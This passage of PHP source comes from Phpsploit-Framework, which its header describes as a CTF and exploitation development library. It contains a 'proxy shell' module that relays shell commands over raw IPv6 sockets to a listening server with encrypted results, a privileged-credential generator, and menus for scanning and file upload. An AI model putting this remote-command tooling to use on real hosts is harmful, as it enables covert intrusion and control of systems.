                        "value"    => ( ( ! empty( $_encode_iv_base64 ) ) ? ( str_replace ( " " , "+" , $_encode_iv_base64 ) ) : ( '' ) ) ,
                    ) ,
                    array (
                        "id"       => "md5_token" ,
                        "title"    => "( Cli Md5 Token ) : " ,
                        "describe" => "Cli Md5 Token" ,
                        "name"     => "md5_token" ,
                        "value"    => ( ( ! empty( $_md5_token ) ) ? ( $_md5_token ) : ( '' ) ) ,
                    ) ,
                ) ,
                "textareas" => array (
                    array (
                        "id"    => "command_id" ,
                        "title" => "( Shell Command )   : " ,
                        "name"  => "command" ,
                        "value" => ( $_command ) ,
                        "style" => 'height:200px;' ,
                    ) ,
                    array (
                        "id"       => $_send_request_result_id ,
                        "title"    => "( Send Request )   : " ,
                        "name"     => "result" ,
                        "value"    => "" ,
                        "disabled" => "disabled" ,
                        "style"    => 'height:200px;' ,
                    ) ,
                    array (
                        "id"       => "cli_encode_url" ,
                        "title"    => "( Cli Encode URL )   : " ,
                        "name"     => "cli_encode_url" ,
                        "value"    => ( 'cli url : ' . $_cli_url . "\n\n" . 'cli encode url : ' . $_cli_encode_url . "\n\n" ) ,
                        "disabled" => "disabled" ,
                        "style"    => 'height:400px;' ,
                    ) ,
                ) ,
            );
            $_top                    = Class_View_Top ::top ();
            $_body                   = array (
                "menu"    => Class_View_ProxyShell_Menu ::menu ( array () ) ,
                "content" => ( ( $_form_top ) . Class_View ::form_body ( $_form ) ) ,
            );
            $_bottom_menu            = array (
                array (
                    "title"    => "" ,
                    "describe" => "" ,
                    "href"     => "#" ,
                ) ,
            );
            $_content                = '<div></div>';
            $_javascript             = '<script type="text/javascript">function init(){ } function to_submit(form_object){  console.log("form is submit"); return true;}</script>';
            $_bottom                 = Class_View_Bottom ::bottom ( $_bottom_menu , $_content , $_javascript );
            Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        }
        if ( is_root_permissions () && ( ! empty( $_command ) ) ) {
            try {

                $_send_request_result = Class_Operate_ProxyShell ::send ( $_src_ipv6_address , $_dst_ipv6_address , $_proxy_ipv6_address , $_command , $_encode_key , $_encode_iv_base64 , $_debug );
                if ( ! is_cli () ) {
                    Class_Base_Response ::output_textarea_inner_html ( $_send_request_result_id , ( "\n" . ( print_r ( $_send_request_result , true ) ) ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                } else {
                    Class_Base_Response ::outputln ( "\n" . ( print_r ( $_send_request_result , true ) ) . "\n" );
                }
            } catch ( \Exception $e ) {
                if ( ! is_cli () ) {
                    Class_Base_Response ::output_textarea_inner_html ( $_send_request_result_id , ( "\n" . ( print_r ( $e , true ) ) ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                } else {
                    Class_Base_Response ::outputln ( "\n" . ( print_r ( $e , true ) ) . "\n" );
                }
            }
        }

        return null;
    }

    public static function receive ( $params = array () )
    {
        if ( is_cli () ) {
            global $_SESSION;
            if ( ! is_array ( $_SESSION ) ) {
                $_SESSION = array ();
            }
        }
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        $_debug            = Class_Base_Request ::form ( "debug" , Class_Base_Request::TYPE_INTEGER , 0 );
        $_md5_token        = Class_Base_Request ::form ( "md5_token" , Class_Base_Request::TYPE_STRING , ( ( empty( $_SESSION[ "PHPSPLOIT_FRAMEWORK_MD5_TOKEN" ] ) ) ? ( "" ) : ( $_SESSION[ "PHPSPLOIT_FRAMEWORK_MD5_TOKEN" ] ) ) );
        $_local_ipv6       = Class_Base_Request ::form ( "local_ipv6" , Class_Base_Request::TYPE_STRING , ( Class_Base_RawSocket ::get_local_ipv6_address () ) );
        $_encode_key       = Class_Base_Request ::form ( "encode_key" , Class_Base_Request::TYPE_STRING , "" );
        $_encode_iv_base64 = Class_Base_Request ::form ( "encode_iv_base64" , Class_Base_Request::TYPE_STRING , "" );
        if ( is_cli () ) {
            if ( is_root_permissions () ) {
                if ( ( ! empty( $_encode_key ) ) && ( ! empty( $_encode_iv_base64 ) ) && ( is_string ( $_encode_key ) ) && ( is_string ( $_encode_iv_base64 ) ) ) {
                    Class_Operate_ProxyShell ::receive ( $_encode_key , $_encode_iv_base64 , $_local_ipv6 , "result_show_id" , $_debug );
                }
            }
        }
        if ( ! is_cli () ) {
            $_cli_url        = Class_Base_Response ::get_cli_url ( "/shell/proxy_shell/receive" , array ( "encode_key" => $_encode_key , "encode_iv_base64" => $_encode_iv_base64 , "local_ipv6" => $_local_ipv6 , "debug" => $_debug ) );
            $_cli_encode_url = Class_Base_Response ::get_urlencode ( $_cli_url );
            $_form_top       = '<div style="margin-top:64px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Receive Command Execute Result From Proxy Shell Server</div>';
            $_form_top       .= '<div style="margin-top:16px;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">This module function is mainly used to receive command execution results from the server side of the PROXY SHELL environment.</span></div>';
            $_form           = array (
                "action"    => "/shell/proxy_shell/receive" ,
                "inputs"    => array (
                    array (
                        "id"       => "md5_token" ,
                        "title"    => "( Cli Md5 Token ) : " ,
                        "describe" => "Cli Md5 Token" ,
                        "name"     => "md5_token" ,
                        "value"    => ( ( ! empty( $_md5_token ) ) ? ( $_md5_token ) : ( '' ) ) ,
                    ) ,
                    array (
                        "id"       => "local_ipv6" ,
                        "title"    => "( Local Ipv6 Address ) : " ,
                        "describe" => "Local Ipv6 Address" ,
                        "name"     => "local_ipv6" ,
                        "value"    => ( ( ! empty( $_local_ipv6 ) ) ? ( $_local_ipv6 ) : ( '' ) ) ,
                    ) ,
                    array (
                        "id"       => "encode_key" ,
                        "title"    => "( Encode Key ) : " ,
                        "describe" => "Encode Key" ,
                        "name"     => "encode_key" ,
                        "value"    => ( ( ! empty( $_encode_key ) ) ? ( $_encode_key ) : ( '' ) ) ,
                    ) ,
                    array (
                        "id"       => "encode_iv_base64" ,
                        "title"    => "( Encode IV Base64 ) : " ,
                        "describe" => "Encode IV Base64" ,
                        "name"     => "encode_iv_base64" ,
                        "value"    => ( ( ! empty( $_encode_iv_base64 ) ) ? ( str_replace ( " " , "+" , $_encode_iv_base64 ) ) : ( '' ) ) ,
                    ) ,
                ) ,
                "textareas" => array (
                    array (
                        "id"       => "cli_encode_url" ,
                        "title"    => "( Cli Encode URL )   : " ,
                        "name"     => "cli_encode_url" ,
                        "value"    => ( 'cli url : ' . $_cli_url . "\n\n" . 'cli encode url : ' . $_cli_encode_url . "\n\n" ) ,
                        "disabled" => "disabled" ,
                        "style"    => 'height:400px;' ,
                    ) ,
                ) ,
            );
            $_top            = Class_View_Top ::top ();
            $_body           = array (
                "menu"    => Class_View_ProxyShell_Menu ::menu ( array () ) ,
                "content" => ( ( $_form_top ) . Class_View ::form_body ( $_form ) ) ,
            );
            $_bottom_menu    = array (
                array (
                    "title"    => "" ,
                    "describe" => "" ,
                    "href"     => "#" ,
                ) ,
            );
            $_content        = '<div></div>';
            $_javascript     = '<script type="text/javascript">function init(){ } function to_submit(form_object){  console.log("form is submit"); return true;}</script>';
            $_bottom         = Class_View_Bottom ::bottom ( $_bottom_menu , $_content , $_javascript );
            Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        }
        return null;
    }

    public static function listen ( $params = array () )
    {
        if ( is_cli () ) {
            global $_SESSION;
            if ( ! is_array ( $_SESSION ) ) {
                $_SESSION = array ();
            }
        }
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        $_debug              = Class_Base_Request::form ("debug",Class_Base_Request::TYPE_INTEGER,0);
        $_local_ipv6 = Class_Base_Request ::form ( "local_ipv6" , Class_Base_Request::TYPE_STRING , ( Class_Base_RawSocket ::get_local_ipv6_address () ) );
        $_md5_token  = Class_Base_Request ::form ( "md5_token" , Class_Base_Request::TYPE_STRING , ( ( empty( $_SESSION[ "PHPSPLOIT_FRAMEWORK_MD5_TOKEN" ] ) ) ? ( "" ) : ( $_SESSION[ "PHPSPLOIT_FRAMEWORK_MD5_TOKEN" ] ) ) );
        if ( is_cli () ) {
            if ( is_root_permissions () ) {
                Class_Operate_ProxyShell ::listen ( $_local_ipv6 , "result_show_id",$_debug );
            }
        }
        if ( ! is_cli () ) {
            $_cli_url        = Class_Base_Response ::get_cli_url ( "/shell/proxy_shell/listen" , array ( "local_ipv6" => $_local_ipv6,"debug"=>$_debug ) );
            $_cli_encode_url = Class_Base_Response ::get_urlencode ( $_cli_url );
            $_form_top       = '<div style="margin-top:64px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Listen in Proxy Shell Server</div>';
            $_form_top       .= '<div style="margin-top:16px;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">This module function is used to listen, receive, and execute command information from the PROXY SHELL environment client. Both communication parties have implemented secure encryption before officially sending data. The encryption key is automatically assigned when the server monitoring module in the PROXY SHELL environment is activated. Both the client and server of the PROXY SHELL environment must use matching security keys to encrypt and decrypt communication data. Therefore, when calling the relevant module functions of the PROXY SHELL environment, you may need to pass necessary information (including encode_key, encode_ivbase64, session_id, md5_token, etc.) to the relevant modules. Note that this module is currently only available in command line environments! When you officially start the listening module function of the PROXY SHELL environment server in the command line environment, you need to pay attention to the security key information generated by this listening module and displayed on the command line interface (including encode_key and encode_iv_base64). The command sending module and command execution result receiving module of the PROXY SHELL environment client will use them to encrypt and decrypt the sent and received data!</span></div>';
            $_form           = array (
                "action"    => "/shell/proxy_shell/listen" ,
                "inputs"    => array (
                    array (
                        "id"       => "local_ipv6" ,
                        "title"    => "( Local IPV6 Address ) : " ,
                        "describe" => "Local IPV6 Address" ,
                        "name"     => "local_ipv6" ,
                        "value"    => ( ( ! empty( $_local_ipv6 ) ) ? ( $_local_ipv6 ) : ( '' ) ) ,
                    ) ,
                    array (
                        "id"       => "md5_token" ,
                        "title"    => "( Cli Md5 Token ) : " ,
                        "describe" => "Cli Md5 Token" ,
                        "name"     => "md5_token" ,
                        "value"    => ( ( ! empty( $_md5_token ) ) ? ( $_md5_token ) : ( '' ) ) ,
                    ) ,
                ) ,
                "textareas" => array (
                    array (
                        "id"       => "cli_encode_url" ,
                        "title"    => "( Cli Encode URL )   : " ,
                        "name"     => "cli_encode_url" ,
                        "value"    => ( 'cli url : ' . $_cli_url . "\n\n" . 'cli encode url : ' . $_cli_encode_url . "\n\n" ) ,
                        "disabled" => "disabled" ,
                        "style"    => 'height:400px;' ,
                    ) ,
                ) ,
            );
            $_top            = Class_View_Top ::top ();
            $_body           = array (
                "menu"    => Class_View_ProxyShell_Menu ::menu ( array () ) ,
                "content" => ( ( $_form_top ) . Class_View ::form_body ( $_form ) ) ,
            );
            $_bottom_menu    = array (
                array (
                    "title"    => "" ,
                    "describe" => "" ,
                    "href"     => "#" ,
                ) ,
            );
            $_content        = '<div></div>';
            $_javascript     = '<script type="text/javascript">function init(){ } function to_submit(form_object){  console.log("form is submit"); return true;}</script>';
            $_bottom         = Class_View_Bottom ::bottom ( $_bottom_menu , $_content , $_javascript );
            Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        }
        return null;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-5-27
 * Time: 下午6:55
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Controller_User extends Class_Controller
{
    public static function index ( $params = array () )
    {
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        if ( ! is_cli () ) {
            $_top    = Class_View_Top ::top ();
            $_body   = array (
                "menu"    => Class_View_User_Menu ::menu () ,
                "content" => "" ,
            );
            $_bottom = Class_View_Bottom ::bottom ();
            Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        }
        return null;
    }

    public static function create_production_privilege_user_password ( $params = array () )
    {
        if ( is_cli () ) {
            global $_SESSION;
            if ( ! is_array ( $_SESSION ) ) {
                $_SESSION = array ();
            }
        }
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        $_init_user            = str_replace ( "?" , "!" , str_replace ( "&" , "!" , str_replace ( "=" , "!" , Class_Base_Request ::form ( "init_user" , Class_Base_Request::TYPE_STRING , "0day" ) ) ) );
        $_init_password        = str_replace ( "?" , "!" , str_replace ( "&" , "!" , str_replace ( "=" , "!" , Class_Base_Auth ::create_password () ) ) );
        $_encode_init_user     = "";
        $_encode_init_password = "";
        if ( ( strlen ( $_init_user ) > 0 ) && ( strlen ( $_init_password ) > 0 ) ) {
            $_encode_init_user     = Class_Operate_User ::create_privilege_encode_user ( $_init_user );
            $_encode_init_password = Class_Operate_User ::create_privilege_encode_password ( $_init_password );
        }
        if ( ! is_cli () ) {
            $_cli_url        = Class_Base_Response ::get_cli_url ( "/user/create_production_privilege_user_password" , array ( "init_user" => $_init_user , "init_password" => $_init_password , ) );
            $_cli_encode_url = Class_Base_Response ::get_urlencode ( $_cli_url );
            $_form_top       = '<div style="margin-top:64px;margin-bottom:128px;height: 32px;text-align: center;font-size: 18px;">Create an Initialization Privileged Account and Password for the Production Environment</br><p style="color:red;text-align: left;">This operation will only dynamically generate and output encrypted information for the new privileged account and corresponding password, and will not really change the configuration content of the framework file! You need to manually update the content values of the framework global constants (PRIVILEGE_USER-MODULE_USER) and (PRIVILEGE_USER-MODULE_PASSWORD)!</p></div>';
            $_form           = array (
                "action" => "/user/create_production_privilege_user_password" ,
                "inputs" => array (
                    array (
                        "id"       => "user" ,
                        "title"    => "( Privileged User ) : " ,
                        "describe" => "Privileged Account for the Production Environment" ,
                        "name"     => "init_user" ,
                        "value"    => $_init_user ,
                    ) ,
                    array (
                        "id"       => "password" ,
                        "title"    => "( Privileged User Password ) : " ,
                        "describe" => "Privileged Password for the Production Environment" ,
                        "name"     => "init_password" ,
                        "value"    => $_init_password ,
                        "disabled" => "disabled" ,
                    ) ,
                    array (
                        "id"       => "user" ,
                        "title"    => "( Encode Privileged User ) : " ,
                        "describe" => "Encode Privileged Account for the Production Environment" ,
                        "name"     => "init_user" ,
                        "value"    => $_encode_init_user ,
                        "disabled" => "disabled" ,
                    ) ,
                    array (
                        "id"       => "password" ,
                        "title"    => "( Encode Privileged User Password ) : " ,
                        "describe" => "Encode Privileged Password for the Production Environment" ,
                        "name"     => "init_password" ,
                        "value"    => $_encode_init_password ,
                        "disabled" => "disabled" ,
                    ) ,
                ) ,
                "textareas" => array (
                    array (
                        "id"       => "cli_encode_url" ,
                        "title"    => "( Cli Encode URL )   : " ,
                        "name"     => "cli_encode_url" ,
                        "value"    => ( 'cli url : ' . $_cli_url . "\n\n" . 'cli encode url : ' . $_cli_encode_url . "\n\n" ) ,
                        "disabled" => "disabled" ,
                        "style"    => 'height:400px;' ,
                    ) ,
                ) ,
                "submit" => array (
                    "display" => true ,
                ) ,
                "reset"  => array (
                    "display" => true ,
                ) ,
            );
            $_top            = Class_View_Top ::top ();
            $_body           = array (
                "menu"    => Class_View_User_Menu ::menu ( array () ) ,
                "content" => ( ( $_form_top ) . Class_View ::form_body ( $_form ) ) ,
            );
            $_bottom_menu    = array (
                array (
                    "title"    => "" ,
                    "describe" => "" ,
                    "href"     => "#" ,
                ) ,
            );
            $_content        = '<div></div>';
            $_javascript     = '<script type="text/javascript">function init(){ } function to_submit(form_object){  console.log("form is submit"); return true;}</script>';
            $_bottom         = Class_View_Bottom ::bottom ( $_bottom_menu , $_content , $_javascript );
            Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        } else {
            Class_Base_Response ::outputln ( "\n" . 'This operation will only dynamically generate and output encrypted information for the new privileged account and corresponding password, and will not really change the configuration content of the framework file! You need to manually update the content values of the framework global constants (PRIVILEGE_USER-MODULE_USER) and (PRIVILEGE_USER-MODULE_PASSWORD)!' );
            Class_Base_Response ::outputln ( "Privileged User : " . $_init_user );
            Class_Base_Response ::outputln ( "Privileged User Password : " . $_init_password );
            Class_Base_Response ::outputln ( "Encode Privileged User : " . $_encode_init_user );
            Class_Base_Response ::outputln ( "Encode Privileged User Password : " . $_encode_init_password );
        }
        return null;
    }

    public static function user_info ( $params = array () )
    {
        if ( is_cli () ) {
            global $_SESSION;
            if ( ! is_array ( $_SESSION ) ) {
                $_SESSION = array ();
            }
        }
        if ( ( ! is_cli () ) && ( ! Class_Base_Auth ::is_login () ) ) {
            Class_Base_Response ::redirect ( "/login" );
            return null;
        }
        Class_Base_Auth ::check_permission ();
        if ( is_cli () ) {
            Class_Base_Response ::outputln ( "\n" . 'Note that this command is not valid on the command line!' );
            Class_Base_Response ::outputln (
                array (
                    "PHPSPLOIT_FRAMEWORK_USER"      => ( empty( $_SESSION[ "PHPSPLOIT_FRAMEWORK_USER" ] ) ? "" : $_SESSION[ "PHPSPLOIT_FRAMEWORK_USER" ] ) ,
                    "PHPSPLOIT_FRAMEWORK_PASSWORD"  => ( empty( $_SESSION[ "PHPSPLOIT_FRAMEWORK_PASSWORD" ] ) ? "" : $_SESSION[ "PHPSPLOIT_FRAMEWORK_PASSWORD" ] ) ,
                    "PHPSPLOIT_FRAMEWORK_MD5_TOKEN" => ( empty( $_SESSION[ "PHPSPLOIT_FRAMEWORK_MD5_TOKEN" ] ) ? "" : $_SESSION[ "PHPSPLOIT_FRAMEWORK_MD5_TOKEN" ] ) ,
                )
            );
        }
        if ( ! is_cli () ) {
            $_cli_url        = Class_Base_Response ::get_cli_url ( "/user/user_info" , array () );
            $_cli_encode_url = Class_Base_Response ::get_urlencode ( $_cli_url );
            $_form_top       = '<div style="margin-top:64px;margin-bottom:16px;height: 32px;text-align: center;font-size: 18px;">Display account name, account password, MD5 token information</div>';
            $_form_top       .= '<div style="width:100%;word-break:break-all;margin-top:16px;padding-left:0;padding-right:0;text-align: left;font-size: 18px;"><span style="font-size: 18px;color:red;">Warning: You must remember the following three pieces of information, which will be used for the login behavior of this framework software before you perform the initialization operation again.Note: The temporary account cache information of the Phpsploit Framework software is stored in the Session environment. If you try to access this interface in a command-line environment, you may not be able to obtain valid information. Because in general, processes in the command line environment cannot obtain session environment information in the web environment (although we can achieve session environment information exchange between the web environment and the command line environment through special technical means. However, in order to reduce the software\'s inherent environmental dependencies and improve the software\'s compatibility and availability, the author of this software did not choose to do so).</div>';
            $_form           = array (
                "action"    => "/user/user_info" ,
                "inputs"    => array (
                    array (
                        "id"       => "user" ,
                        "title"    => "( User Name ) : " ,
                        "describe" => "User Name" ,
                        "name"     => "user" ,
                        "value"    => ( empty( $_SESSION[ "PHPSPLOIT_FRAMEWORK_USER" ] ) ? "" : $_SESSION[ "PHPSPLOIT_FRAMEWORK_USER" ] ) ,
                        "disabled" => "disabled" ,
                    ) ,
                    array (
                        "id"       => "password" ,
                        "title"    => "( User Password ) : " ,
                        "describe" => "User Password" ,
                        "name"     => "password" ,
                        "value"    => ( empty( $_SESSION[ "PHPSPLOIT_FRAMEWORK_PASSWORD" ] ) ? "" : $_SESSION[ "PHPSPLOIT_FRAMEWORK_PASSWORD" ] ) ,
                        "disabled" => "disabled" ,
                    ) ,
                    array (
                        "id"       => "md5_token" ,
                        "title"    => "( MD5 Token ) : " ,
                        "describe" => "MD5 Token" ,
                        "name"     => "md5_token" ,
                        "value"    => ( empty( $_SESSION[ "PHPSPLOIT_FRAMEWORK_MD5_TOKEN" ] ) ? "" : $_SESSION[ "PHPSPLOIT_FRAMEWORK_MD5_TOKEN" ] ) ,
                        "disabled" => "disabled" ,
                    ) ,
                ) ,
                "textareas" => array (
                    array (
                        "id"       => "cli_encode_url" ,
                        "title"    => "( Cli Encode URL )   : " ,
                        "name"     => "cli_encode_url" ,
                        "value"    => ( 'cli url : ' . $_cli_url . "\n\n" . 'cli encode url : ' . $_cli_encode_url . "\n\n" ) ,
                        "disabled" => "disabled" ,
                        "style"    => 'height:400px;' ,
                    ) ,
                ) ,
                "submit"    => array (
                    "display" => false ,
                ) ,
                "reset"     => array (
                    "display" => false ,
                ) ,
            );
            $_top            = Class_View_Top ::top ();
            $_body           = array (
                "menu"    => Class_View_User_Menu ::menu ( array () ) ,
                "content" => ( ( $_form_top ) . Class_View ::form_body ( $_form ) ) ,
            );
            $_bottom_menu    = array (
                array (
                    "title"    => "" ,
                    "describe" => "" ,
                    "href"     => "#" ,
                ) ,
            );
            $_content        = '<div></div>';
            $_javascript     = '<script type="text/javascript">function init(){ } function to_submit(form_object){  console.log("form is submit"); return true;}</script>';
            $_bottom         = Class_View_Bottom ::bottom ( $_bottom_menu , $_content , $_javascript );
            Class_Base_Response ::output ( Class_View ::index ( $_top , $_body , $_bottom ) , "text" , 0 );
        }
        return null;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-4-8
 * Time: 下午3:40
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_View_Scan_Menu
{
    private static $_menu = null;

    public static function menu ( $params = array () )
    {
        if ( ! is_array ( $params ) ) {
            $params = array ();
        }
        if ( ( ! isset( $params[ "webs" ] ) ) || ( ! is_array ( $params[ "webs" ] ) ) ) {
            $params[ "webs" ] = array ();
        }
        if ( ( ! isset( $params[ "webs" ][ "urls" ] ) ) || ( ! is_string ( $params[ "webs" ][ "urls" ] ) ) ) {
            $params[ "webs" ][ "urls" ] = "";
        }
        if ( ( ! isset( $params[ "domain" ] ) ) || ( ! is_array ( $params[ "domain" ] ) ) ) {
            $params[ "domain" ] = array ();
        }
        if ( ( ! isset( $params[ "domain" ][ "ip" ] ) ) || ( ! is_string ( $params[ "domain" ][ "ip" ] ) ) ) {
            $params[ "domain" ][ "ip" ] = "";
        }
        if ( ( ! isset( $params[ "domain" ][ "ports" ] ) ) || ( ! is_string ( $params[ "domain" ][ "ports" ] ) ) ) {
            $params[ "domain" ][ "ports" ] = "";
        }
        if ( ( ! isset( $params[ "tamperproof" ] ) ) || ( ! is_array ( $params[ "tamperproof" ] ) ) ) {
            $params[ "tamperproof" ] = array ();
        }
        if ( ( ! isset( $params[ "tamperproof" ][ "sampling_directory_path" ] ) ) || ( ! is_string ( $params[ "tamperproof" ][ "sampling_directory_path" ] ) ) ) {
            $params[ "tamperproof" ][ "sampling_directory_path" ] = "";
        }
        if ( ( ! isset( $params[ "tamperproof" ][ "detection_directory_path" ] ) ) || ( ! is_string ( $params[ "tamperproof" ][ "detection_directory_path" ] ) ) ) {
            $params[ "tamperproof" ][ "detection_directory_path" ] = "";
        }
        if ( empty( self::$_menu ) ) {
            self::$_menu = array (
                array (
                    "title"    => "webs" ,
                    "describe" => "" ,
                    "href"     => Class_Base_Response::get_url ( "/scan/webs" , array ( "urls" => $params[ "webs" ][ "urls" ] , ) ) ,
                ) ,
                array (
                    "title"    => "domain" ,
                    "describe" => "" ,
                    "href"     => Class_Base_Response::get_url ( "/scan/domain" , array ( "ip" => $params[ "domain" ][ "ip" ] , "ports" => $params[ "domain" ][ "ports" ] ) ) ,
                ) ,
                array (
                    "title"    => "tamperproof" ,
                    "describe" => "" ,
                    "href"     => Class_Base_Response::get_url ( "/scan/tamperproof" , array ( "sampling_directory_path" => $params[ "tamperproof" ][ "sampling_directory_path" ] , "detection_directory_path" => $params[ "tamperproof" ][ "detection_directory_path" ] ) ) ,
                ) ,
            );
        }
        return self::$_menu;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-4-8
 * Time: 下午3:40
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_View_Elf_Menu
{
    private static $_menu = null;

    public static function menu ( $params = array () )
    {
        if ( ! is_array ( $params ) ) {
            $params = array ();
        }
        if ( empty( self::$_menu ) ) {
            self::$_menu = array (
                array (
                    "title"    => "elf_64" ,
                    "describe" => "" ,
                    "href"     => Class_Base_Response::get_url ( "/elf/elf64" , array () ) ,
                ) ,
                array (
                    "title"    => "elf_h" ,
                    "describe" => "" ,
                    "href"     => Class_Base_Response::get_url ( "/elf/elf_h" , array () ) ,
                ) ,
            );
        }
        return self::$_menu;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-4-8
 * Time: 下午3:40
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_View_File_Menu
{
    private static $_menu = null;

    public static function menu ( $params = array () )
    {
        if ( is_cli () ) {
            global $_SERVER;
            if ( ! is_array ( $_SERVER ) ) {
                $_SERVER = array ();
            }
        }
        if ( ! is_array ( $params ) ) {
            $params = array ();
        }
        if ( ( ! isset( $params[ "search" ] ) ) || ( ! is_array ( $params[ "search" ] ) ) ) {
            $params[ "search" ] = array ();
        }
        if ( ( ! isset( $params[ "search" ][ "file_name" ] ) ) || ( ! is_string ( $params[ "search" ][ "file_name" ] ) ) ) {
            $params[ "search" ][ "file_name" ] = "";
        }
        if ( ( ! isset( $params[ "search" ][ "current_directory_path" ] ) ) || ( ! is_string ( $params[ "search" ][ "current_directory_path" ] ) ) ) {
            $params[ "search" ][ "current_directory_path" ] = str_replace ( "\\" , "/" , $_SERVER[ "DOCUMENT_ROOT" ] );
        }
        if ( ( ! isset( $params[ "explorer" ] ) ) || ( ! is_array ( $params[ "explorer" ] ) ) ) {
            $params[ "explorer" ] = array ();
        }
        if ( ( ! isset( $params[ "explorer" ][ "current_directory_path" ] ) ) || ( ! is_string ( $params[ "explorer" ][ "current_directory_path" ] ) ) ) {
            $params[ "explorer" ][ "current_directory_path" ] = str_replace ( "\\" , "/" , $_SERVER[ "DOCUMENT_ROOT" ] );
        }
        if ( ( ! isset( $params[ "create" ] ) ) || ( ! is_array ( $params[ "create" ] ) ) ) {
            $params[ "create" ] = array ();
        }
        if ( ( ! isset( $params[ "create" ][ "current_directory_path" ] ) ) || ( ! is_string ( $params[ "create" ][ "current_directory_path" ] ) ) ) {
            $params[ "create" ][ "current_directory_path" ] = "";
        }
        if ( ( ! isset( $params[ "create" ][ "new_file_name" ] ) ) || ( ! is_string ( $params[ "create" ][ "new_file_name" ] ) ) ) {
            $params[ "create" ][ "new_file_name" ] = "";
        }
        if ( ( ! isset( $params[ "create" ][ "data_type" ] ) ) || ( ! Class_Base_Format::is_integer ( ( $params[ "create" ][ "data_type" ] ) ) ) ) {
            $params[ "create" ][ "data_type" ] = Class_Base_Format::TYPE_DATA_TEXT;
        }
        if ( ( ! isset( $params[ "create" ][ "file_content" ] ) ) || ( ! is_string ( $params[ "create" ][ "file_content" ] ) ) ) {
            $params[ "create" ][ "file_content" ] = '';
        }
        if ( ( ! isset( $params[ "upload" ] ) ) || ( ! is_array ( $params[ "upload" ] ) ) ) {
            $params[ "upload" ] = array ();
        }
        if ( ( ! isset( $params[ "upload" ][ "current_directory_path" ] ) ) || ( ! is_string ( $params[ "upload" ][ "current_directory_path" ] ) ) ) {
            $params[ "upload" ][ "current_directory_path" ] = "";
        }
        if ( ( ! isset( $params[ "clear" ] ) ) || ( ! is_array ( $params[ "clear" ] ) ) ) {
            $params[ "clear" ] = array ();
        }
        if ( ( ! isset( $params[ "clear" ][ "file_name" ] ) ) || ( ! is_string ( $params[ "clear" ][ "file_name" ] ) ) ) {
            $params[ "clear" ][ "file_name" ] = "";
        }
